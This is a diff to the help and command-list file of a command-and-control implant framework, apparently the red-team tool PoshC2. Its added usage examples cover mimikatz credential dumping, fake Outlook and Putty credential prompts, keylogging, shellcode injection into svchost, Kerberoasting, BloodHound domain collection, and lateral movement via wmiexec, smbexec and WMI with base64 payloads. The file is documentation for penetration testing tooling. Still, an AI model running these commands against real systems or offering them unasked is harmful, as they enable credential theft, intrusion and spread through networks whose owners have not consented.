@@ -45,6 +45,7 @@ hide-implant
 unhide-implant
 help
 searchhelp persistence
+searchhistory invoke-mimikatz
 back
 label-implant <newlabel>
 remove-label
@@ -57,11 +58,14 @@ sharp_help1 = Colours.GREEN + """
 Implant Features:
 =====================
 ps
+corehelp
 beacon 60s / beacon 10m / beacon 2h
 turtle 60s / turtle 30m / turtle 8h
+pwd
 ls c:\\temp\\
 ls-recurse c:\\temp\\
-delete c:\\temp\\test.exe
+del
+posh-delete c:\\temp\\test.exe
 move c:\\temp\\old.exe c:\\temp\\new.exe
 copy c:\\temp\\test.exe c:\\temp\\test.bac
 get-content c:\\temp\\log.txt
@@ -72,19 +76,22 @@ sharpps get-process
 pslo powerview.ps1
 runas <user> <password> <os command> <domain> <timeout> <logontype>
 runasps <domain> <user> <password> <ps command>
-pwd
 kill-process 1890
+sslinspectioncheck https://www.google.com <proxyhost> <proxyuser> <proxypass> <useragent>
 create-lnk c:\\users\\public\\test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
 create-startuplnk test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
 resolveip 127.0.0.1
 resolvednsname google.com
 loadmodule Seatbelt.exe
 loadmoduleforce
-listmodule
+listmodules
 modulesloaded
 run-exe Core.Program Core
 run-dll Seatbelt.Program Seatbelt UserChecks
+run-dll SharpSploit.Enumeration.Host SharpSploit GetHostname
+run-dll SharpSploit.Enumeration.Host SharpSploit GetProcessList
 start-process net users
+start-shortcut c:\\users\\public\\image.lnk
 download-file "c:\\temp\\test.exe"
 upload-file -source /tmp/test.exe -destination "c:\\temp\\test.exe"
 kill-implant
@@ -99,25 +106,33 @@ bypass-amsi
 quit
 back
 
+Running PS
+==========
+sharpps $psversiontable
+pslo powerview.ps1
+
 Migration
 ===========
 migrate
-inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoofid>
-inject-shellcode 1453 <optional-ppid-spoofid>
+inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
+inject-shellcode <pid>
 
 Privilege Escalation:
 =======================
 arpscan 172.16.0.1/24 true
 get-serviceperms c:\\temp\\
 get-screenshot
-get-screenshotmulti
+get-screenshotmulti 2m
+stop-screenshotmulti
+get-screenshotallwindows
 start-keystrokes
 start-keystrokes-writefile
 get-keystrokes
 stop-keystrokes
 testadcredential domain username password
 testlocalcredential username password
-cred-popper
+cred-popper "Outlook" "Please Enter Your Domain Credentials"
+cred-popper "Putty" "Please re-enter your OTP code" root@172.16.0.1
 get-hash
 sharpup
 sharpweb all
@@ -135,6 +150,14 @@ safetydump
 safetydump <pid>
 safetykatz minidump
 safetykatz full
+
+Mimikatz via SharpSploit:
+===========================
+mimikatz Wdigest
+mimikatz LsaSecrets
+mimikatz LsaCache
+mimikatz SamDump
+mimikatz Command "privilege::debug sekurlsa::logonPasswords"
 
 Network Tasks:
 ================
@@ -160,11 +183,15 @@ sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computer
 sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
 sharpwmi action=query query="select * from win32_process" computername=SERVER01 username=DOMAIN\\user password=Password123!
 sharpwmi action=query query="select * FROM AntiVirusProduct" namespace="root\\SecurityCenter2"
-sharpwmi action=executevbs computername=SERVER01,SERVER02
+getremoteprocesslisting SERVER01 explorer.exe
+getremoteprocesslisting SERVER01,SERVER02,SERVER03 taskhost.exe
+getremoteprocesslistingall SERVER01,SERVER02
 
 Lateral Movement:
 ==================
 sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
+sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
 wmiexec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
 smbexec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\public\\run.dll,etp"
 dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
@@ -186,8 +213,8 @@ run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/
 
 Bloodhound:
 ===========
-sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
-sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\ --RandomFilenames --CollectionMethod DcOnly --NoSaveCache --DomainController <DC1-NAME>
+sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,Default,RDP,DCOM,DCOnly --outputdirectory c:\\users\\public --nosavecache --zipfilename backup_small.zip --collectallproperties
+sharphound -c Container,Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,ObjectProps,ACL,Trusts,Default,RDP,DCOM --outputdirectory c:\\users\\public --nosavecache --zipfilename backup_full.zip --collectallproperties
 
 Run Generic C# Executable:
 =============================
@@ -314,6 +341,7 @@ invoke-aclscanner | Where-Object {$_.IdentityReference -eq [System.Security.Prin
 get-objectacl -resolveguids -samaccountname john
 add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
 get-netuser -admincount | select samaccountname
+get-netuser -uacfilter not_accountdisable -properties samaccountname,pwdlastset
 get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
 get-netgroup -admincount | select samaccountname
 get-netgroupmember "domain admins" -recurse|select membername
@@ -321,6 +349,7 @@ get-netcomputer | select-string -pattern "citrix"
 get-netcomputer -filter operatingsystem=*7*|select name
 get-netcomputer -filter operatingsystem=*2008*|select name
 get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=poshc2,DC=co,DC=uk"|select name
+get-netcomputer -domaincontroller internal.domain.com -domain internal.domain.com -Filter "(lastlogontimestamp>=$((Get-Date).AddDays(-30).ToFileTime()))(samaccountname=UK*)"|select name,lastlogontimestamp,operatingsystem
 get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
 get-netgroup | select-string -pattern "internet"
 get-netuser -filter | select-object samaccountname,userprincipalname
@@ -350,6 +379,8 @@ get-netdomaincontroller | select name | get-netsession | select *username,*cname
 get-dfsshare | get-netsession | select *username,*cname
 get-netfileserver | get-netsession | select *username,*cname
 invoke-kerberoast -outputformat hashcat|select-object -expandproperty hash
+get-domaingpouserlocalgroupmapping -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
+get-domaingpouserlocalgroupmapping -LocalGroup RDP -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
 write-scffile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
 write-inifile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
 get-netgroup | select-string -pattern "internet"
@@ -492,8 +523,8 @@ cleartasks
 show-serverinfo
 history
 generate-reports
-set-clockworksmsapikey df2
-set-clockworksmsnumber 44789
+set-pushover-applicationtoken df2
+set-pushover-userkeys 44789
 set-defaultbeacon 60
 set-killdate 22/10/2019
 turnon-notifications
@@ -550,10 +581,10 @@ UXCOMMANDS = ["label-implant", "remove-label", "unhide-implant", "hide-implant",
               "startanotherimplant-keepfile", "get-screenshot", "startanotherimplant", "pwd", "id", "ps", "setbeacon", "kill-implant", "linuxprivchecker", "quit", "searchhistory"]
 
 # post help commands sharp implant
-SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keystrokes", "start-keystrokes-writefile", "get-keystrokes", "delete", "move", "label-implant", "remove-label", "upload-file", "quit",
+SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keystrokes", "start-keystrokes-writefile", "get-keystrokes", "move", "label-implant", "remove-label", "upload-file", "quit",
                  "download-file", "get-content", "ls-recurse", "turtle", "cred-popper", "resolveip", "resolvednsname", "testadcredential",
                  "testlocalcredential", "get-screenshot", "modulesloaded", "get-serviceperms", "unhide-implant", "arpscan", "ls", "pwd", "dir",
-                 "inject-shellcode", "start-process", "run-exe", "run-dll", "hide-implant", "help", "searchhelp", "listmodules", "loadmodule",
+                 "inject-shellcode", "start-process", "start-shortcut", "run-exe", "run-dll", "hide-implant", "help", "searchhelp", "listmodules", "loadmodule",
                  "loadmoduleforce", "back", "ps", "beacon", "setbeacon", "kill-implant", "get-screenshotmulti", "safetydump", "seatbelt", "sharpup",
                  "sharphound", "rubeus", "sharpview", "kill-process", "watson", "get-hash", "migrate", "sharpsocks", "safetykatz", "get-computerinfo",
                  "get-dodgyprocesses", "sharpweb", "bypass-amsi", "sharpsc", "dcomexec", "smbexec", "wmiexec", "sharpwmi", "sharpcookiemonster", "stop-screenshotmulti",
